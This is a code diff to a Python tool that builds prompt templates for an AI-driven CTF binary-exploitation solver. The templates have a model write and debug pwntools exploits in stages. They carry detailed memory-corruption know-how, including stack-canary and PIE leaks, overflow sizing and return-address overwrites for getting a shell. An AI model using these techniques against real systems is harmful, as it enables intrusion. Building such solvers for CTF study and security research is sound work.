+```c
+{{ source_code_snippet }}
+```
+**I/O PROTOCOL NOTES (from source code):**
+- `read()` calls: use `p.sendafter(b"<prompt>", data)` — raw bytes, no forced newline needed
+- `scanf("%d", ...)` calls: use `p.sendlineafter(b"<prompt>", value)` — needs newline
+- After `scanf("%d", ...)`, a leftover `\n` remains in stdin. If the next `read()` reads only that `\n` and strips it, `len` becomes 0 → **infinite loop** inside the memcpy-repeat `while(count < target_len)`. Always use `p.sendlineafter(b"Target length: ", ...)` (NOT `p.recvuntil(...) + p.sendline()`).
+{% endif %}
+
 {% if io_patterns %}
 ## I/O Patterns (from decompiled code)
 {% for pattern in io_patterns %}
@@ -3078,16 +3543,41 @@ The following helper functions are generated from the decompiled binary.
 ```
 {% endif %}
 
+{% if additions_only %}
+Generate the **Stage {{ current_stage.stage_index + 1 }} additions** for: {{ current_stage.stage_id }}.
+Description: {{ current_stage.description }}
+Expected marker: `{{ current_stage.verification_marker }}`
+
+**REMINDER: Output ONLY Stage {{ current_stage.stage_index + 1 }} code (no imports, no process setup, no Stage 1 leak code).
+The `exploit_code` field should start directly with Stage {{ current_stage.stage_index + 1 }} I/O interactions.**
+{% else %}
 Generate the exploit code for **Stage {{ current_stage.stage_index + 1 }}: {{ current_stage.stage_id }}**.
 Description: {{ current_stage.description }}
 Expected marker: `{{ current_stage.verification_marker }}`
+{% endif %}
 """)
 
 
 STAGE_REFINE_SYSTEM = env.from_string("""You are an expert at debugging pwntools exploits.
 
 A staged exploit script failed at **Stage {{ stage.stage_id }}** (stage {{ stage.stage_index + 1 }}).
-{% if stage.stage_index > 0 %}
+{% if base_code_snippet %}
+## ADDITIONS-ONLY REFINEMENT
+
+The following verified Stage 1 code is **automatically prepended** to your output — you do NOT need to include it.
+**Do NOT reproduce this code in your `exploit_code` field:**
+```python
+{{ base_code_snippet }}
+```
+
+**Variables already in scope:** `p`, `elf`, and any variables defined above (e.g. `canary`, `pie_base`).
+
+**Your `exploit_code` must contain ONLY the Stage {{ stage.stage_index + 1 }} fix:**
+- NO `from pwn import *`
+- NO `p = process(...)` / `p = remote(...)`
+- NO re-implementation of Stage 1 logic
+- Start directly with Stage {{ stage.stage_index + 1 }} actions (fix the broken part)
+{% elif stage.stage_index > 0 %}
 Previous stages (1~{{ stage.stage_index }}) were verified working. Do NOT modify their logic.
 Only fix the Stage {{ stage.stage_index + 1 }} portion of the code.
 {% endif %}
@@ -3098,11 +3588,11 @@ The expected verification marker is: `{{ stage.verification_marker }}`
 ```json
 {
   "reasoning": "What went wrong and how to fix it",
-  "exploit_code": "from pwn import *\\ncontext.log_level = 'debug'\\n...(complete fixed script)",
+  "exploit_code": "{% if base_code_snippet %}# Stage {{ stage.stage_index + 1 }} additions only (Stage 1 base prepended automatically)\\n...{% else %}from pwn import *\\ncontext.log_level = 'debug'\\n...(complete fixed script){% endif %}",
   "changes_made": ["List of changes"]
 }
 ```
-**exploit_code MUST include** `context.log_level = 'debug'` immediately after imports.
+{% if not base_code_snippet %}**exploit_code MUST include** `context.log_level = 'debug'` immediately after imports.{% endif %}
 
 CRITICAL: NEVER use p.interactive(). After triggering shell, verify with:
 ```python
@@ -3139,6 +3629,57 @@ Focus on:
 - Null byte handling
 - Timing issues (add sleep if needed)
 
+**Canary/PIE leak specific checks (if this is a leak stage):**
+- `p.recvn(N)` without first consuming full output → reads prompt text instead of canary → I/O desync.
+  Fix: use `p.recvuntil(b"<next_prompt>")` then slice at `buf_offset_to_canary`.
+- Canary printed as ASCII (e.g. `0x72657474617...`) → bytes are printable → I/O desync confirmed.
+  Validate: `sum(1 for b in canary.to_bytes(8,'little') if 0x20<=b<=0x7e) < 7`
+- Canary LSB ≠ 0x00 → wrong extraction. Stack canary always has `\x00` at lowest byte.
+  Fix: `canary = u64(raw.ljust(8, b'\x00')) & ~0xff`
+- `pie_base = 0x555555554000` hardcoded → WRONG with ASLR. Must compute from leaked return address.
+  Fix: `pie_base = leaked_ret - <static_ret_offset>; assert pie_base & 0xfff == 0`
+- PIE leak not page-aligned (`pie_base & 0xfff != 0`) → wrong offset used to subtract from ret addr.
+- **RAW return address bytes are printable ASCII** (≥6 of 8 bytes are printable, e.g. "attern", "prtern"):
+  `printf` stopped at a null byte in the saved RBP/canary BEFORE reaching the return address.
+  The bytes you're reading are actually the NEXT PROMPT STRING ("Pattern: " etc.), not a real address.
+  → The return address was NEVER in the received output.
+  Fix — aggressive overwrite technique: use a SEPARATE overflow interaction that overwrites the
+  canary + saved_RBP + saved_RIP all with non-null bytes. This removes the null-byte barriers so
+  puts() can read deeper into the stack. A PIE-range pointer (e.g., main()'s address stored by
+  the libc startup wrapper) appears at a deeper stack offset — use pwndbg x/40gx $rsp + vmmap
+  to find the exact offset, then extract and mask to compute pie_base.
+- **saved RIP is a LIBC address, not PIE**: main() is called from __libc_start_call_main (libc),
+  so [rbp+8] contains a libc address. `leaked & ~0xfff` gives libc base, NOT binary base.
+  Fix: find a binary-range address at a deeper stack position using pwndbg + vmmap.
+
+**REPEAT-LOOP / memcpy-repeat specific checks:**
+- **Wrong pattern_len → too many bytes written, destroys PIE target**:
+  The memcpy loop writes `floor((target_len-1)/pattern_len)*pattern_len + pattern_len` bytes total.
+  To expose buf[X] without destroying it, you need EXACTLY X bytes written:
+  ```
+  Required: floor((target_len-1) / pattern_len) * pattern_len + pattern_len == X
+  Example: X=1032, target=1000 → need pattern_len=43  (23×43=989, last write: buf[989..1031]) ✓
+           X=1032, pattern_len=80 → 12×80=960, last write: buf[960..1039] = 1040 bytes → DESTROYS buf[1032]!
+  ```
+  Check the "Last Received Bytes" hexdump above. If all bytes at the target offset are 41/42/43...
+  (your fill pattern), you wrote too many bytes. Reduce pattern_len to hit exactly buf[X-1].
+
+- **scanf `\n` I/O desync — effective pattern_len is 1 more than sent bytes**:
+  After `scanf("%d")` reads target_len, a `\n` is left in stdin.
+  The NEXT `read()` call gets `\n` as its FIRST byte → effective pattern_len = sent_bytes + 1.
+  For iteration 2+: to achieve effective=43, send only 42 bytes.
+  **TIMEOUT** often means the inner `while(count < target_len)` is spinning forever because:
+  - The `\n` alone was received as a 1-byte pattern in the next round.
+  - With pattern_len=1 and target_len=1000, the loop repeats 1000 times, looking for more input.
+  Fix: always use `sendafter(b"Pattern: ", ...)` which syncs to the prompt before sending,
+  and count: to achieve effective=N in iteration ≥2, send N-1 bytes.
+
+**SHELL_FAILED / no shell with 'STAGE1_OK' printed:**
+- Check the pwntools debug output `[DEBUG] Sent N bytes:` for the exploit payload.
+  Look at the last 8 bytes (return address slot) in the hex dump (the `│···│` ASCII column).
+  If those bytes spell readable text (like `│prte│rn··│`), the win_addr computation is wrong.
+  The pie_base used for win_addr was computed from garbage (prompt text), not a real binary address.
+
 **I/O RULES (most common failure cause):**
 - Each `scanf()` call needs its own `p.sendlineafter(prompt, value)`
 - Each `read()` call needs its own `p.sendafter(prompt, data)`
@@ -3150,6 +3691,18 @@ Focus on:
 - If it says "unsorted bin leak", keep that approach
 - Only fix HOW the technique is implemented (I/O, offsets, sizes), not WHAT technique is used
 - Changing from stdout BSS to GOT leak is a STRATEGY CHANGE — FORBIDDEN in refinement
+
+## ⛔ NO-GUESSING RULES FOR REFINEMENT
+
+Do NOT "fix" code by replacing known values with guesses. Every change must be justified by the error output or source/decompile.
+
+| Category | FORBIDDEN | CORRECT |
+|----------|-----------|---------|
+| **I/O prompt strings** | Changing `b"Pattern: "` to `b"Enter: "` without evidence | Keep exact string from source code. If the prompt string is wrong, find the ACTUAL string in source/decompile. |
+| **`recvuntil` for `scanf` prompts** | `p.recvuntil(b"Target length: \\n")` | `scanf` outputs "Target length: " with NO trailing newline/CR. Use `sendlineafter(b"Target length: ", ...)`. |
+| **Buffer offsets** | Changing `buf_offset_to_canary` to a random value | Only change if GDB output or error clearly shows a different offset. |
+| **Win/function address** | Hardcoding a new address without evidence | Reuse `win_function_addr` from Analysis Document. |
+| **Adding `recvuntil` before `send`** | `p.recvuntil(b"length.\\r\\n")` when `read()` prompt has no newline | `read()` calls don't add newline. Check source: if prompt ends with `: ` (no `\\n`), don't use `recvuntil`-with-newline. |
 """)
 
 
@@ -3164,11 +3717,35 @@ STAGE_REFINE_USER = env.from_string("""## Failing Stage: {{ stage.stage_id }} (S
 
 ## Error Output
 ```
-{{ error_output[:2000] }}
+{{ error_output[:5000] }}
 ```
+
+{% if stage.last_hex_dump %}
+## Last Received Bytes (Raw Hexdump — most critical for leak analysis)
+This is what the exploit script ACTUALLY received from the binary in its last few interactions.
+Use this to determine what was leaked at each offset:
+```
+{{ stage.last_hex_dump }}
+```
+**How to read this**: Each line is `offset  hex_bytes  │ascii│`. The offset is from the START of what puts()/printf() printed.
+- Canary is at `buf_offset_to_canary` (e.g. offset 1000 = 0x3e8): look for the 8 bytes there.
+- PIE leak target is further past canary+RBP+RIP — look at offset 1032+ for binary-range addresses (0x55... or 0x56...).
+- If all bytes are `41 41 41...` (all 'A's), the overwrite wrote TOO MANY bytes and destroyed the target data.
+{% endif %}
 
 ## Analysis Document
 {{ analysis_document }}
+
+{% if source_code_snippet %}
+## Binary Source Code (GROUND TRUTH — use this for exact I/O protocol)
+```c
+{{ source_code_snippet }}
+```
+**I/O PROTOCOL NOTES (from source code):**
+- `read()` calls: use `p.sendafter(b"<prompt>", data)` — raw bytes, no forced newline
+- `scanf("%d", ...)` calls: use `p.sendlineafter(b"<prompt>", value)` — needs newline
+- After `scanf("%d", ...)`, a leftover `\n` remains in stdin. If the next `read()` gets only that `\n` and strips it, `len` becomes 0 → **infinite loop** in the inner `while(count < target_len)`. Always use `p.sendlineafter(b"Target length: ", ...)` (NOT `p.recvuntil(...) + p.sendline()`).
+{% endif %}
 
 {% if io_helper_code %}
 ## Correct I/O Helper Functions (USE THESE)
@@ -3304,6 +3881,8 @@ def build_stage_exploit_messages(
     state: SolverState,
     current_stage: Dict[str, Any],
     verified_stages: List[Dict[str, Any]],
+    additions_only: bool = False,
+    base_code_snippet: str = "",
 ) -> List[Dict[str, str]]:
     """Build prompt messages for stage exploit generation."""
     analysis = state.get("analysis", {})
@@ -3316,10 +3895,26 @@ def build_stage_exploit_messages(
         challenge=state.get("challenge", {}),
         binary_path=state.get("binary_path", ""),
         docker_port=state.get("docker_port", 0),
+        additions_only=additions_only,
+        base_code_snippet=base_code_snippet,
     )
 
     # Generate I/O helper code from decompiled binary
     io_helper_code = _generate_io_helper_code(state)
+
+    # Extract C source code from binary directory
+    source_code_snippet = ""
+    try:
+        import glob as _glob, os as _os
+        binary_path_str = state.get("binary_path", "")
+        if binary_path_str:
+            workdir = _os.path.dirname(_os.path.abspath(binary_path_str))
+            for c_file in _glob.glob(_os.path.join(workdir, "*.c")):
+                with open(c_file, "r", errors="replace") as _f:
+                    source_code_snippet = _f.read()[:4000]
+                    break
+    except Exception:
+        pass
 
     user_content = STAGE_EXPLOIT_USER.render(
         analysis_document=build_analysis_document(state),
@@ -3328,6 +3923,8 @@ def build_stage_exploit_messages(
         decompiled_functions=analysis.get("decompile", {}).get("functions", []),
         current_stage=current_stage,
         io_helper_code=io_helper_code,
+        additions_only=additions_only,
+        source_code_snippet=source_code_snippet,
     )
 
     return [
